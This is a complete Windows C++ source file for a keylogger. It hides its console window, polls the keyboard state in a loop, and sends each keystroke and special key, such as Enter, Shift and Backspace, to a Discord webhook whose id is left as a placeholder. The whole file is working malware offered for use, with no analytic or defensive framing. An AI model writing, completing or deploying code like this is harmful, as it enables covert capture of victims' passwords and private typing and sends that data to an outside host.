#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <iostream>

#pragma comment(lib, "winhttp.lib")

using namespace std;
void SendToDiscord(const std::string& message);
void LOG(const std::string& input);
bool SpecialKeys(int S_Key);

void SendToDiscord(const std::string& message) {
    HINTERNET hSession = WinHttpOpen(L"A Keylogger/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com",
            INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
                L"/api/webhooks/YOUR WEBHOOK ID",
                NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                WINHTTP_FLAG_SECURE);
            if (hRequest) {
                std::wstring headers = L"Content-Type: application/json\r\n";
                std::string json = "{\"content\": \"" + message + "\"}";

                BOOL bResults = WinHttpSendRequest(hRequest,
                    headers.c_str(),
                    -1L,
                    (LPVOID)json.c_str(),
                    (DWORD)json.length(),
                    (DWORD)json.length(),
                    0);
                if (bResults) {
                    WinHttpReceiveResponse(hRequest, NULL);
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

void LOG(const std::string& input) {
    SendToDiscord(input);
}

bool SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        LOG("#SPACE#"); 
        return true;

    case VK_RETURN:
        LOG("#ENTER#"); 
        return true;

    case VK_SHIFT:
        LOG("#SHIFT#");
        return true;

    case VK_BACK:
        LOG("#BACKSPACE#");
        return true;

    case VK_RBUTTON:
        LOG("#RIGHT_CLICK#");
        return true;

    case VK_CAPITAL:
        LOG("#CAPS_LOCK#");
        return true;

    case VK_TAB:
        LOG("#TAB#");
        return true;

    case VK_UP:
        LOG("#UP_ARROW#");
        return true;

    case VK_DOWN:
        LOG("#DOWN_ARROW#");
        return true;

    case VK_LEFT:
        LOG("#LEFT_ARROW#");
        return true;

    case VK_RIGHT:
        LOG("#RIGHT_ARROW#");
        return true;

    case VK_CONTROL:
        LOG("#CONTROL#");
        return true;

    case VK_MENU:
        LOG("#ALT#");
        return true;

    default:
        return false;
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        Sleep(10);
        for (int KEY = 8; KEY <= 190; KEY++) {
            if (GetAsyncKeyState(KEY) & 0x8000) {
                if (!SpecialKeys(KEY)) {
                    char key = MapVirtualKey(KEY, MAPVK_VK_TO_CHAR);
                    if (key) {
                        LOG(std::string(1, key));
                    }
                }
            }
        }
    }

    return 0;
}
